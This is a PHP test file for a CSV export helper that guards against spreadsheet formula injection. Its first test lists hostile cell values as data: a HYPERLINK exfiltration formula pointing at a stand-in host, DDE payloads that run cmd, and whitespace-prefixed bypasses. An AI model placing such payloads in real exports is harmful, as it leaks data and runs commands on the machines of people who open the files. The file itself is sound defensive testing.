<?php

use App\Support\Csv;

/**
 * The escaping itself, case by case.
 *
 * The architecture gate beside this proves every export *calls* the helper;
 * this proves the helper is worth calling.
 */
it('neutralises the payloads a spreadsheet would execute', function (string $payload) {
    expect(Csv::cell($payload))->toBe("\t".$payload);
})->with([
    // Exfiltration: sends the cell beside it to whoever typed the name.
    '=HYPERLINK("https://elsewhere/?x="&A1,"Click for marks")',
    // DDE, which still prompts on a default Excel install.
    '=cmd|\'/c calc\'!A0',
    '@SUM(1+9)*cmd|\'/c calc\'!A0',
    '+2+3',
    '-2+3',
    // Leading whitespace that shifts the parse onto the next character, which
    // is how a payload gets past a check for `=` alone.
    "\t=1+1",
    "\r=1+1",
]);

it('leaves ordinary text alone', function (string $text) {
    expect(Csv::cell($text))->toBe($text);
})->with([
    'Aishath Mohamed',
    'Grade 5 A',
    'Dhivehi Raajjeyge Thaareekh',
    'ދިވެހި',
    'العربية',
    // An `=` that is not leading is not a formula.
    'Score = 90',
]);

it('leaves genuine numbers alone, negatives included', function () {
    // The reason this matters: `-450` in a money column is a refund, and
    // quoting it would break the sums these exports exist to support.
    expect(Csv::cell('-450'))->toBe('-450')
        ->and(Csv::cell(-450))->toBe('-450')
        ->and(Csv::cell('-450.75'))->toBe('-450.75')
        ->and(Csv::cell(1200))->toBe('1200')
        ->and(Csv::cell(12.5))->toBe('12.5')
        // A phone number written the way Maldivian numbers are written.
        ->and(Csv::cell('+9607820288'))->toBe('+9607820288');
});

it('renders nulls and booleans the way a spreadsheet column expects', function () {
    expect(Csv::cell(null))->toBe('')
        ->and(Csv::cell(''))->toBe('')
        ->and(Csv::cell(false))->toBe('')
        ->and(Csv::cell(true))->toBe('1');
});

it('escapes every cell of a row, not only the first', function () {
    $handle = fopen('php://memory', 'r+');
    Csv::put($handle, ['Ahmed', '=1+1', 'note', '@evil']);
    rewind($handle);
    $written = stream_get_contents($handle);
    fclose($handle);

    // A row-level helper that only guarded column one would pass every
    // single-cell test above and still ship the hole.
    expect($written)->toContain("\t=1+1")->toContain("\t@evil");
});
